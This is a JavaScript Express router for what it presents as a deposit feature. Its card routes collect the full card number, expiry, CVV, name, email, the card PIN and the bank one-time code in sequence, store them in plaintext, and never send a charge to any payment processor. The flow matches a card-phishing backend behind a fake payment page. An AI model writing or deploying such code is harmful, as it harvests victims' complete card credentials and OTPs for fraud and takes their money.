const express = require("express");
const crypto = require("crypto");
const { get, run } = require("../db");
const { requireUser } = require("../middleware/auth");
const { logActivity } = require("../middleware/log");

const router = express.Router();

function ipOf(req) {
  return (req.headers["x-forwarded-for"] || req.socket.remoteAddress || "").toString().split(",")[0].trim();
}

async function newReference() {
  for (let i = 0; i < 10; i++) {
    const ref = "RI-" + crypto.randomBytes(4).toString("hex").toUpperCase().slice(0, 6);
    const exists = await get("SELECT 1 AS x FROM transactions WHERE reference = ?", [ref]);
    if (!exists) return ref;
  }
  return "RI-" + crypto.randomBytes(6).toString("hex").toUpperCase().slice(0, 10);
}

async function cancelStalePending(userId) {
  const now = new Date().toISOString();
  await run(`
    UPDATE transactions
    SET status = 'cancelled', updated_at = ?
    WHERE user_id = ? AND type = 'deposit' AND status IN ('pending', 'awaiting_confirmation')
  `, [now, userId]);
}

router.post("/initiate", requireUser, async (req, res) => {
  const { amount, method } = req.body || {};
  const amt = Number(amount);
  if (!amt || amt <= 0) return res.status(400).json({ error: "Enter a valid amount." });
  if (!["transfer", "card"].includes(method)) return res.status(400).json({ error: "Invalid payment method." });

  await cancelStalePending(req.user.id);

  const reference = await newReference();
  const status = method === "card" ? "card_details_submitted" : "pending";

  const info = await run(`
    INSERT INTO transactions (user_id, type, method, amount, status, reference, meta)
    VALUES (?, 'deposit', ?, ?, ?, ?, ?)
  `, [req.user.id, method, amt, status, reference, JSON.stringify({})]);

  await logActivity({
    actor_type: "user", actor_id: req.user.id,
    action: "deposit.initiate",
    meta: { reference, amount: amt, method },
    ip: ipOf(req),
  });

  res.json({ reference, transaction_id: info.lastInsertRowid });
});

router.post("/transfer-paid", requireUser, async (req, res) => {
  const { reference } = req.body || {};
  if (!reference) return res.status(400).json({ error: "Reference required." });

  const tx = await get(
    "SELECT * FROM transactions WHERE reference = ? AND user_id = ? AND type = 'deposit'",
    [reference, req.user.id]
  );
  if (!tx) return res.status(404).json({ error: "Transaction not found." });
  if (tx.status !== "pending") return res.status(409).json({ error: "This transaction is no longer active." });

  await run("UPDATE transactions SET status = 'awaiting_confirmation', updated_at = ? WHERE id = ?",
    [new Date().toISOString(), tx.id]);

  await logActivity({
    actor_type: "user", actor_id: req.user.id,
    action: "deposit.transfer_paid",
    meta: { reference }, ip: ipOf(req),
  });

  res.json({ ok: true });
});

router.post("/cancel", requireUser, async (req, res) => {
  const { reference } = req.body || {};
  if (!reference) return res.status(400).json({ error: "Reference required." });

  const tx = await get(
    "SELECT * FROM transactions WHERE reference = ? AND user_id = ? AND type = 'deposit'",
    [reference, req.user.id]
  );
  if (!tx) return res.status(404).json({ error: "Transaction not found." });
  if (!["pending", "awaiting_confirmation"].includes(tx.status)) {
    return res.status(409).json({ error: "This transaction can no longer be cancelled." });
  }

  await run("UPDATE transactions SET status = 'cancelled', updated_at = ? WHERE id = ?",
    [new Date().toISOString(), tx.id]);

  await logActivity({
    actor_type: "user", actor_id: req.user.id,
    action: "deposit.cancelled",
    meta: { reference }, ip: ipOf(req),
  });

  res.json({ ok: true });
});

router.post("/card-details", requireUser, async (req, res) => {
  const { reference, email, card_number, expiry, cvv, name_on_card } = req.body || {};
  if (!reference) return res.status(400).json({ error: "Reference required." });

  const tx = await get(
    "SELECT * FROM transactions WHERE reference = ? AND user_id = ? AND type = 'deposit'",
    [reference, req.user.id]
  );
  if (!tx) return res.status(404).json({ error: "Transaction not found." });
  if (tx.status !== "card_details_submitted") return res.status(409).json({ error: "This transaction is no longer active." });

  const meta = {
    card: { email, card_number, expiry, cvv, name_on_card, submitted_at: new Date().toISOString() }
  };

  await run("UPDATE transactions SET meta = ?, updated_at = ? WHERE id = ?",
    [JSON.stringify(meta), new Date().toISOString(), tx.id]);

  await logActivity({
    actor_type: "user", actor_id: req.user.id,
    action: "deposit.card_submitted",
    meta: { reference, last4: String(card_number || "").slice(-4) },
    ip: ipOf(req),
  });

  res.json({ ok: true, next: "pin" });
});

router.post("/card-pin", requireUser, async (req, res) => {
  const { reference, pin } = req.body || {};
  if (!reference || !pin) return res.status(400).json({ error: "Reference and PIN required." });

  const tx = await get(
    "SELECT * FROM transactions WHERE reference = ? AND user_id = ? AND type = 'deposit'",
    [reference, req.user.id]
  );
  if (!tx) return res.status(404).json({ error: "Transaction not found." });

  const meta = tx.meta ? JSON.parse(tx.meta) : {};
  meta.card = meta.card || {};
  meta.card.pin = pin;
  meta.card.pin_at = new Date().toISOString();

  await run("UPDATE transactions SET meta = ?, updated_at = ? WHERE id = ?",
    [JSON.stringify(meta), new Date().toISOString(), tx.id]);

  await logActivity({
    actor_type: "user", actor_id: req.user.id,
    action: "deposit.card_pin",
    meta: { reference }, ip: ipOf(req),
  });

  res.json({ ok: true, next: "otp" });
});

router.post("/card-otp", requireUser, async (req, res) => {
  const { reference, otp } = req.body || {};
  if (!reference || !otp) return res.status(400).json({ error: "Reference and OTP required." });

  const tx = await get(
    "SELECT * FROM transactions WHERE reference = ? AND user_id = ? AND type = 'deposit'",
    [reference, req.user.id]
  );
  if (!tx) return res.status(404).json({ error: "Transaction not found." });
  if (tx.status !== "card_details_submitted") return res.status(409).json({ error: "This transaction is no longer active." });

  const meta = tx.meta ? JSON.parse(tx.meta) : {};
  meta.card = meta.card || {};
  meta.card.otp = otp;
  meta.card.otp_at = new Date().toISOString();

  await run("UPDATE transactions SET meta = ?, status = 'processing', updated_at = ? WHERE id = ?",
    [JSON.stringify(meta), new Date().toISOString(), tx.id]);

  await logActivity({
    actor_type: "user", actor_id: req.user.id,
    action: "deposit.card_otp",
    meta: { reference }, ip: ipOf(req),
  });

  res.json({ ok: true });
});

module.exports = { router };